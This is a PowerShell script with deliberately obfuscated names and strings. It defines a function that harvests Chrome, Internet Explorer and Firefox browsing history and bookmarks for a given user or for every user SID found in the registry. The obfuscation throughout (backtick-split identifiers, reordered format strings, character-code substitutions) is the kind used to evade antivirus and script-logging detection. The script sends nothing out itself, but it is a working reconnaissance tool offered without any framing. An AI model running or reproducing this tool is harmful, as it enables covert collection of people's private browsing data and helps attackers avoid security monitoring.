function g`ET-brO`W`seR`iNfo`Rm`ATioN {

    [CmdletBinding()]
    Param
    (
        [Parameter(PosItion = 0)]
        [String[]]
        [ValidateSet({"{1}{0}" -f 'rome','Ch'},'IE',{"{1}{0}{2}" -f'o','FireF','x'}, 'All')]
        ${BRo`ws`er} = 'All',

        [Parameter(POsITIOn = 1)]
        [String[]]
        [ValidateSet({"{0}{1}" -f'Hi','story'},{"{0}{1}{2}"-f'B','o','okmarks'},'All')]
        ${D`A`Ta`TYpE} = 'All',

        [Parameter(POsITiOn = 2)]
        [String]
        ${Use`R`NAME} = '',

        [Parameter(positiON = 3)]
        [String]
        ${S`Ear`ch} = ''
    )



    function Co`NVE`R`TfrOm-JSo`N`20([object] ${it`em}){
        
        &("{2}{1}{0}"-f 'pe','d-Ty','Ad') -AssemblyName ("{1}{3}{2}{0}" -f'.Extensions','S','stem.Web','y')
        ${p`s_js} = &("{0}{1}{3}{2}" -f'New-Obj','e','t','c') ("{3}{4}{8}{0}{7}{6}{1}{2}{5}"-f'.Seri','n.JavaScriptSer','ialize','S','ystem.W','r','lizatio','a','eb.Script')
        return ,${pS_`Js}.("{2}{3}{1}{0}{4}"-f 'c','izeObje','D','eserial','t').Invoke(${iT`eM})
        
    }

    function G`Et-c`HRomEH`ISt`orY {
        ${p`Ath} = ("$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User "+('Dataa'+'KtDe'+'fa'+'u'+'ltaKtHistor'+'y')."rEPl`ACE"(([chAR]97+[chAR]75+[chAR]116),'\'))
        if (-not (&("{0}{1}"-f'T','est-Path') -Path ${P`AtH})) {
            &("{1}{0}{2}" -f 'rite-Verbos','W','e') ('[!]'+' '+'Could'+' '+'no'+'t '+'fin'+'d '+'Ch'+'r'+'ome '+'H'+'istor'+'y '+'for'+' '+'userna'+'me'+': '+"$UserName")
        }
        ${r`eg`Ex} = (((("{6}{0}{8}{5}{3}{10}{2}{7}{4}{9}{1}{11}" -f'))','/?%&=]*','YqLw','+YqL.)+','(/[YqLw- ','([YqLw-]','(htt(pgKds','-]+','://','.','[',')*?'))-cREPLaCe([Char]89+[Char]113+[Char]76),[Char]92 -rePlAce  'gKd',[Char]124))
        ${v`ALuE} = &("{2}{3}{0}{1}"-f'on','tent','Ge','t-C') -Path ("$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User "+('Data{0}D'+'efa'+'ul'+'t{'+'0}Hi'+'story')  -f[ChAR]92)|&("{2}{3}{0}{1}" -f 'Str','ing','Selec','t-') -AllMatches ${re`gex} |&('%') {(${_}."MA`TchEs")."VA`Lue"} |&("{1}{0}" -f'rt','So') -Unique
        ${vA`l`UE} | &("{0}{2}{4}{1}{3}"-f 'F','ch-Ob','orE','ject','a') {
            ${K`Ey} = ${_}
            if (${k`Ey} -match ${SEar`ch}){
                &("{2}{1}{0}" -f'Object','-','New') -TypeName ("{1}{0}{2}" -f'bjec','PSO','t') -Property @{
                    ("{0}{1}"-f'Us','er') = ${u`S`ernaME}
                    ("{2}{1}{0}"-f 'wser','o','Br') = ("{1}{0}"-f 'hrome','C')
                    ("{0}{1}{2}"-f 'Data','T','ype') = ("{0}{1}"-f'Histo','ry')
                    ("{0}{1}"-f'Dat','a') = ${_}
                }
            }
        }        
    }

    function GE`T`-CHromeBOO`KmARkS {
    ${PA`TH} = ("$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User "+(('D'+'at'+'aOA'+'sDefau'+'l'+'tO'+'A'+'sBookmarks')  -ReplAce'OAs',[CHAR]92))
    if (-not (&("{2}{1}{0}" -f'ath','-P','Test') -Path ${P`ATh})) {
        &("{0}{3}{1}{2}"-f 'Wr','-','Verbose','ite') ('[!]'+' '+'Co'+'uld '+'n'+'ot '+'fin'+'d '+'F'+'ir'+'eFox '+'Bookm'+'ark'+'s '+'for'+' '+'userna'+'me:'+' '+"$UserName")
    }   else {
            ${j`son} = &("{3}{0}{1}{2}"-f'et-','Conte','nt','G') ${p`AtH}
            ${O`U`Tput} = &("{2}{4}{0}{3}{1}" -f 'rtF','m-Json20','Con','ro','ve')(${Js`ON})
            ${J`sONo`Bje`CT} = ${ouT`Put}."r`OoTs"."bo`O`kMar`k_BaR"."C`HI`ldren"
            ${JSO`N`objECT}."U`RL" |&("{1}{0}"-f 'ort','S') -Unique | &("{0}{4}{2}{3}{1}" -f'ForEac','t','-Obje','c','h') {
                if (${_} -match ${sEa`Rch}) {
                    &("{0}{2}{1}"-f 'Ne','bject','w-O') -TypeName ("{0}{1}" -f 'PSObj','ect') -Property @{
                        ("{1}{0}"-f'r','Use') = ${US`ErNa`mE}
                        ("{0}{1}{2}" -f 'Br','ow','ser') = ("{1}{2}{0}" -f 'efox','Fi','r')
                        ("{2}{0}{1}" -f'at','aType','D') = ("{2}{0}{1}" -f'oo','kmark','B')
                        ("{1}{0}" -f 'ata','D') = ${_}
                    }
                }
            }
        }
    }

    function g`et-iNt`eRn`E`TexPloRe`RhI`S`Tory {
        

        ${NU`Ll} = &("{0}{1}{2}"-f'Ne','w-P','SDrive') -Name ("{1}{0}" -f 'KU','H') -PSProvider ("{0}{2}{1}"-f 'Reg','try','is') -Root ("{1}{0}{2}"-f'SER','HKEY_U','S')
        ${P`ATHs} = &("{3}{0}{1}{2}" -f 'et-Ch','il','dItem','G') ((("{0}{1}" -f 'HKU:','WM1'))  -rEpLaCE([cHaR]87+[cHaR]77+[cHaR]49),[cHaR]92) -ErrorAction ("{5}{0}{3}{1}{4}{2}"-f 'ly','i','e','Cont','nu','Silent') | &("{0}{2}{1}"-f 'W','e-Object','her') { ${_}."N`AmE" -match (('S-1-5-21-[0-9'+']+-[0'+'-'+'9]'+'+'+'-[0'+'-9'+']'+'+-[0-'+'9]'+'+{0'+'}')-f [ChAr]36) }

        ForEach(${Pa`Th} in ${pat`hS}) {

            ${Us`eR} = ([System.Security.Principal.SecurityIdentifier] ${pA`Th}."Pschi`Ldn`A`mE")."tRAnsla`Te"( [System.Security.Principal.NTAccount]) | &("{0}{1}"-f'Sel','ect') -ExpandProperty ("{0}{1}" -f'Valu','e')

            ${pa`Th} = ${pA`Th} | &("{0}{1}{3}{2}" -f 'Sel','ect-','ct','Obje') -ExpandProperty ("{0}{2}{1}" -f'PSP','th','a')

            ${Us`ERp`Ath} = ("$Path\Software\Microsoft\Internet "+('Explo'+'rer'+'jfAT'+'ypedU'+'RLs').("{2}{0}{1}" -f'e','plAce','r').Invoke('jfA','\'))
            if (-not (&("{0}{1}" -f'Test-Pa','th') -Path ${u`sERp`AtH})) {
                &("{0}{2}{1}" -f 'Writ','erbose','e-V') ('['+'!] '+'Co'+'u'+'ld '+'n'+'ot '+'fi'+'nd '+'I'+'E '+'Histo'+'ry '+'for'+' '+'S'+'ID: '+"$Path")
            }
            else {
                &("{1}{2}{0}"-f't-Item','G','e') -Path ${User`p`ATH} -ErrorAction ("{3}{1}{2}{0}" -f 'nue','yCo','nti','Silentl') | &("{0}{2}{1}{3}" -f'ForEa','h-O','c','bject') {
                    ${k`Ey} = ${_}
                    ${k`eY}.("{3}{1}{2}{0}"-f'ueNames','t','Val','Ge').Invoke() | &("{1}{3}{0}{2}"-f'Ob','F','ject','orEach-') {
                        ${Va`lUe} = ${k`EY}.("{0}{1}{2}"-f 'Get','Va','lue').Invoke(${_})
                        if (${Va`LuE} -match ${sEa`R`CH}) {
                            &("{2}{1}{0}"-f 'Object','w-','Ne') -TypeName ("{1}{0}"-f'ject','PSOb') -Property @{
                                ("{1}{0}" -f 'r','Use') = ${UsERN`AMe}
                                ("{2}{0}{1}"-f 'wse','r','Bro') = 'IE'
                                ("{0}{1}"-f'DataTyp','e') = ("{2}{1}{0}" -f'ry','to','His')
                                ("{1}{0}" -f 'ta','Da') = ${vA`l`Ue}
                            }
                        }
                    }
                }
            }
        }
    }

    function GEt`-`In`T`ERneTExp`lOReRbO`okMArks {
        ${u`Rls} = &("{0}{3}{1}{2}"-f 'G','hild','Item','et-C') -Path "$Env:systemdrive\Users\" -Filter ("{0}{1}"-f '*.u','rl') -Recurse -ErrorAction ("{4}{1}{2}{0}{3}"-f'C','ile','ntly','ontinue','S')
        ForEach (${u`RL} in ${UR`lS}) {
            if (${u`RL}."fu`Ll`Name" -match ("{0}{2}{1}" -f'Fa','es','vorit')) {
                ${u`ser} = ${U`Rl}."f`Ul`LnaME".("{1}{0}"-f't','spli').Invoke('\')[2]
                &("{2}{1}{0}" -f'-Content','t','Ge') -Path ${u`RL}."FUl`LNA`Me" | &("{2}{0}{3}{1}" -f 'ch','Object','ForEa','-') {
                    try {
                        if (${_}.("{2}{0}{1}" -f't','sWith','Star').Invoke('URL')) {
                            
                            ${u`Rl} = ${_}.("{2}{1}{0}" -f'ring','st','Sub').Invoke(${_}.("{1}{0}" -f'Of','Index').Invoke('=') + 1)

                            if(${u`RL} -match ${sEAr`CH}) {
                                &("{2}{1}{0}" -f 'ect','j','New-Ob') -TypeName ("{1}{0}"-f'ct','PSObje') -Property @{
                                    ("{0}{1}"-f'Us','er') = ${US`ER}
                                    ("{0}{1}"-f'Brow','ser') = 'IE'
                                    ("{0}{1}" -f'Dat','aType') = ("{0}{2}{1}"-f'Bo','mark','ok')
                                    ("{1}{0}" -f'ta','Da') = ${u`Rl}
                                }
                            }
                        }
                    }
                    catch {
                        &("{2}{3}{0}{1}" -f'rbos','e','W','rite-Ve') ('Er'+'ror'+' '+'parsi'+'n'+'g '+'url:'+' '+"$_")
                    }
                }
            }
        }
    }

    function gET-F`Ir`EFoxHIST`OrY {
        ${PA`Th} = "$Env:systemdrive\Users\$UserName\AppData\Roaming\Mozilla\Firefox\Profiles\"
        if (-not (&("{0}{1}{2}"-f'T','est-Pa','th') -Path ${pA`Th})) {
            &("{2}{3}{0}{1}" -f'Ve','rbose','Wr','ite-') ('[!'+'] '+'Co'+'u'+'ld '+'not'+' '+'fi'+'nd '+'Fire'+'Fox'+' '+'Histo'+'ry'+' '+'fo'+'r '+'us'+'ern'+'ame: '+"$UserName")
        }
        else {
            ${PR`ofIL`Es} = &("{2}{3}{0}{4}{1}" -f '-','em','Ge','t','ChildIt') -Path "$Path\*.default\" -ErrorAction ("{1}{0}{2}{3}" -f'ilentlyCont','S','inu','e')
            ${re`G`EX} = ((("{3}{1}{12}{8}{7}{6}{5}{0}{11}{4}{10}{2}{9}" -f ']+(/[{','tt(','/?%&=]*)*','(h','w- ','+[{0}w-','}.)','0','s))://([{0}w-]+{','?','.','0}','p{1}')) -F  [chAR]92,[chAR]124)
            ${Val`Ue} = &("{2}{1}{0}" -f'ontent','et-C','G') ((("{6}{2}{4}{1}{7}{3}{8}{5}{0}"-f'e','es','1}P','pla','rofil','es.sqlit','{','{0}','c'))-F  [Char]92,[Char]36) | &("{0}{2}{1}{3}{4}"-f 'Select','t','-S','r','ing') -Pattern ${reg`eX} -AllMatches |&("{0}{1}{2}"-f 'Sele','ct-Obj','ect') -ExpandProperty ("{1}{0}" -f 'ches','Mat') |&("{0}{1}"-f 'So','rt') -Unique
            ${V`AL`UE}."Va`LUe" |&("{2}{1}{0}" -f 't','ec','ForEach-Obj') {
                if (${_} -match ${s`EarCH}) {
                    &("{2}{4}{0}{1}{3}" -f 'ach','-Objec','For','t','E') {
                    &("{2}{1}{0}{3}"-f 'bjec','ew-O','N','t') -TypeName ("{2}{0}{1}"-f'SO','bject','P') -Property @{
                        ("{0}{1}"-f'U','ser') = ${USE`Rna`me}
                        ("{1}{2}{0}"-f'r','Brow','se') = ("{1}{0}"-f 'refox','Fi')
                        ("{1}{2}{0}" -f 'Type','D','ata') = ("{1}{0}{2}" -f 't','His','ory')
                        ("{0}{1}" -f 'Dat','a') = ${_}
                        }    
                    }
                }
            }
        }
    }

    if (!${US`eRN`AmE}) {
        ${us`er`NAMe} = "$ENV:USERNAME"
    }

    if((${BROw`SER} -Contains 'All') -or (${B`ROwSEr} -Contains ("{1}{0}" -f'e','Chrom'))) {
        if ((${dAt`A`Type} -Contains 'All') -or (${d`AtA`TYpe} -Contains ("{2}{1}{0}" -f 'ry','to','His'))) {
            &("{0}{4}{2}{5}{3}{1}" -f'Get-','tory','h','s','C','romeHi')
        }
        if ((${Da`TaT`y`PE} -Contains 'All') -or (${DaT`A`TyPe} -Contains ("{1}{2}{0}" -f'ks','Bo','okmar'))) {
            &("{2}{1}{0}{3}"-f'romeB','Ch','Get-','ookmarks')
        }
    }

    if((${brOW`seR} -Contains 'All') -or (${B`ROW`sEr} -Contains 'IE')) {
        if ((${D`A`TAtYpE} -Contains 'All') -or (${D`AtAT`yPe} -Contains ("{0}{1}{2}" -f 'H','ist','ory'))) {
            &("{3}{5}{2}{0}{4}{1}"-f'xplor','rHistory','ernetE','Get-','e','Int')
        }
        if ((${Dat`A`Ty`Pe} -Contains 'All') -or (${Da`T`A`Type} -Contains ("{0}{1}"-f 'Bookm','arks'))) {
            .("{0}{2}{3}{1}{4}"-f'Get-In','a','ternetExplo','rerBookm','rks')
        }
    }

    if((${BR`O`WsEr} -Contains 'All') -or (${bRo`WsER} -Contains ("{2}{1}{0}" -f'ox','ireF','F'))) {
        if ((${D`A`TaTyPE} -Contains 'All') -or (${DaT`At`YPE} -Contains ("{0}{1}" -f 'H','istory'))) {
            &("{1}{5}{2}{4}{3}{0}" -f'y','Get-F','eFo','or','xHist','ir')
        }
    }
}